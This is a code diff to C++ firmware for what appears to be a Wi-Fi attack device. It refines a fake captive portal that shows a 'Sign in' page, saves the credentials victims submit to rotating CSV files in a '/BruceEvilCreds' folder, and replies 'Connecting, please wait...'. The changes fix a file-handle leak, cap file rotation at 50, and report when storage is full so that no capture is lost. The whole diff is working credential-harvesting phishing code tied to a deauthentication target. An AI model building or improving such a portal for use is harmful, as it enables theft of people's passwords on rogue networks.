@@ -1584,6 +1584,7 @@ void tickHandshake() {
 constexpr size_t PORTAL_PAGE_MAX = 24576;
 constexpr char PORTAL_TEMPLATE_DIR[] = "/PortalTemplates";
 constexpr char PORTAL_CREDS_DIR[] = "/BruceEvilCreds";
+constexpr int PORTAL_CREDS_FILE_MAX = 50;  // rotation stops here (50 files x 200 lines)
 const char *const PORTAL_DEFAULT_PAGE = R"HTML(<!DOCTYPE html>
 <html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title></head>
 <body style="font-family:sans-serif;max-width:340px;margin:40px auto;padding:0 16px">
@@ -1615,7 +1616,10 @@ bool loadPortalPage(String &out) {
     while (f) {
         String fname = String(f.name());
         if (fname.endsWith(".html") || fname.endsWith(".htm")) {
-            if (f.size() > PORTAL_PAGE_MAX) break;
+            if (f.size() > PORTAL_PAGE_MAX) {
+                f.close();
+                break;
+            }
             out.reserve(f.size());
             while (f.available()) out += static_cast<char>(f.read());
             snprintf(portalTemplateName, sizeof(portalTemplateName), "%s", fname.c_str());
@@ -1718,7 +1722,7 @@ void appendCapped(const char *path, const String &line) {
     }
 }
 
-void portalCredsPath(char *out, size_t n) {
+bool portalCredsPath(char *out, size_t n) {
     char safe[SPAM_SSID_MAX + 1];
     size_t j = 0;
     for (size_t i = 0; deauthSsid[i] != '\0' && j < SPAM_SSID_MAX; i++) {
@@ -1726,14 +1730,15 @@ void portalCredsPath(char *out, size_t n) {
         safe[j++] = (isalnum(static_cast<unsigned char>(c)) || c == '-' || c == '_') ? c : '_';
     }
     safe[j] = '\0';
-    for (int k = 1; k <= 50; k++) {
+    for (int k = 1; k <= PORTAL_CREDS_FILE_MAX; k++) {
         if (k == 1) {
             snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
         } else {
             snprintf(out, n, "%s/%s_creds_%d.csv", PORTAL_CREDS_DIR, safe, k);
         }
-        if (!SD.exists(out) || countLines(out) < LOG_MAX_ENTRIES) return;
+        if (!SD.exists(out) || countLines(out) < LOG_MAX_ENTRIES) return true;
     }
+    return false;  // every creds file is full: caller reports it instead of dropping silently
 }
 
 void portalHandlePost() {
@@ -1753,15 +1758,18 @@ void portalHandlePost() {
     }
     if (!SD.exists(PORTAL_CREDS_DIR)) SD.mkdir(PORTAL_CREDS_DIR);
     char path[96];
-    portalCredsPath(path, sizeof(path));
-    File f = SD.open(path, FILE_APPEND);
-    if (f) {
-        f.println(line);
-        f.close();
+    if (portalCredsPath(path, sizeof(path))) {
+        File f = SD.open(path, FILE_APPEND);
+        if (f) {
+            f.println(line);
+            f.close();
+        }
+        snprintf(portalCredsName, sizeof(portalCredsName), "%s", path);
+        portalCaptured++;
+        snprintf(portalLast, sizeof(portalLast), "%s", lastVal.c_str());
+    } else {
+        snprintf(portalLast, sizeof(portalLast), "%s", "creds full: not saved");
     }
-    snprintf(portalCredsName, sizeof(portalCredsName), "%s", path);
-    portalCaptured++;
-    snprintf(portalLast, sizeof(portalLast), "%s", lastVal.c_str());
     portalServer.send(200, "text/html", "<html><body style=\"font-family:sans-serif\"><p>Connecting, please wait...</p></body></html>");
 }
 
@@ -1842,7 +1850,7 @@ void tickPortal() {
     }
 }
 
-constexpr int CREDS_FILES_MAX = 40;
+constexpr int CREDS_FILES_MAX = PORTAL_CREDS_FILE_MAX;
 constexpr int CREDS_ENTRIES_MAX = 60;
 constexpr int CREDS_WRAP = 38;
 char credsFileNames[CREDS_FILES_MAX][40];
